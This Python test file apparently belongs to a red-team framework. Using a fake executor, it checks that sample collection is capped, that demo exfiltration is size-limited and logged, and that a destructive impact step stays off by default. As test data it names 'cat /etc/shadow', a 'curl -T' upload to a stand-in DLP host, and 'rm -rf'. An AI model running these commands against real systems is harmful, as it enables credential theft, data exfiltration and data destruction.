"""F5 — collection / exfiltration / impact (maximum gate).

Verifies the hard safety properties: minimal masked collection, size-capped exfil
with an honest DLP log, and that impact_poc is OFF by default (refuses unless
destructive testing is explicitly enabled AND an isolated test directory is given).
"""

import pytest
import pytest_asyncio

from arcanum.core.database import Database
from arcanum.core.graph import GraphManager
from arcanum.redteam.sessions import SessionRegistry
from arcanum.offensive.base import OffensiveContext
from arcanum.offensive import impact as im


class _FakeExecutor:
    def __init__(self, db, sandbox=True, output=""):
        self.db = db
        self.sandbox = sandbox
        self.graph_mgr = GraphManager(db)
        self.cve_kb = None
        self.session_id = "op-1"
        self.commands = []
        self._output = output

    async def execute_tool(self, tool, args):
        self.commands.append(args.get("command", ""))
        return {"success": True, "error": None,
                "output": {"stdout": self._output, "stderr": "", "exit_code": 0}}


class _Cfg:
    def __init__(self, allow):
        self.allow_destructive_testing = allow


@pytest_asyncio.fixture
async def db(tmp_path):
    d = Database(db_path=tmp_path / "im.db")
    await d.connect()
    await d.init_db()
    yield d
    await d.close()


async def _ctx_fh(db, output=""):
    fh = await SessionRegistry(db).create_foothold(
        engagement_id="e1", session_id="op-1", host="10.0.0.5")
    ex = _FakeExecutor(db, output=output)
    return OffensiveContext(executor=ex, db=db, session_id="op-1", engagement_id="e1"), fh


@pytest.mark.asyncio
async def test_collect_sample_is_capped_and_masked(db):
    ctx, fh = await _ctx_fh(db, output="S" * 9999)
    r = await im.collect_sample(ctx, fh["id"], "cat /etc/shadow", max_bytes=10)
    assert r["ok"] is True
    assert r["bytes"] <= 10 and r["cap"] == 10
    assert r["proof"]["proof_type"] == "sample"


@pytest.mark.asyncio
async def test_demo_exfiltration_logs_and_caps(db):
    ctx, fh = await _ctx_fh(db, output="x" * 9999)
    r = await im.demo_exfiltration(ctx, fh["id"], "curl -T data https://dlp-test",
                                   destination="https://dlp-test", max_bytes=100)
    assert r["ok"] is True
    assert r["exfil_log"]["cap_bytes"] == 100
    assert r["exfil_log"]["destination"] == "https://dlp-test"
    assert len(r["proof"]["evidence"]) <= 100


@pytest.mark.asyncio
async def test_impact_poc_off_by_default(db):
    ctx, fh = await _ctx_fh(db)
    r = await im.impact_poc(ctx, fh["id"], "rm -rf /tmp/test/*",
                            test_directory="/tmp/arcanum-test", config=_Cfg(False))
    assert r["ok"] is False and r["executed"] is False
    assert "DESLIGADO" in r["error"] or "ARCANUM_ALLOW_DESTRUCTIVE_TESTING" in r["error"]


@pytest.mark.asyncio
async def test_impact_poc_requires_isolated_test_dir(db):
    ctx, fh = await _ctx_fh(db)
    r = await im.impact_poc(ctx, fh["id"], "cmd", test_directory="", config=_Cfg(True))
    assert r["ok"] is False and r["executed"] is False
    assert "test_directory" in r["error"]


@pytest.mark.asyncio
async def test_impact_poc_runs_when_explicitly_enabled(db):
    ctx, fh = await _ctx_fh(db, output="poc done")
    r = await im.impact_poc(ctx, fh["id"], "touch /tmp/arcanum-test/poc",
                            test_directory="/tmp/arcanum-test", config=_Cfg(True))
    assert r["ok"] is True and r["executed"] is True
    assert r["test_directory"] == "/tmp/arcanum-test"
